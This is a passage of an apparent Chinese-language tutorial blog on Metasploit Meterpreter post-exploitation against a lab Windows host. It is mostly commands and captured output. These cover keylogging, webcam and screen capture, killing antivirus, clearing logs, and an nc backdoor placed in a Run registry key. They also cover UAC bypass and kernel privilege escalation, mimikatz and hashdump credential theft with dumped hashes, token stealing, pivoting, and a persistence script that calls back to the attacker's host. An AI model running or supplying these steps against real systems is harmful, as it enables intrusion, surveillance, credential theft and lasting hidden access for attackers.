class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-4"><a href="#4-2-文件系统命令-4" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-4"><a href="#4-3-网络命令-4" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-4"><a href="#4-4-信息收集-4" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-4"><a href="#4-5-提权-4" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-4"><a href="#4-6-获取凭证-4" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-4"><a href="#4-7-假冒令牌-4" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-4"><a href="#4-8-植入后门-4" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as 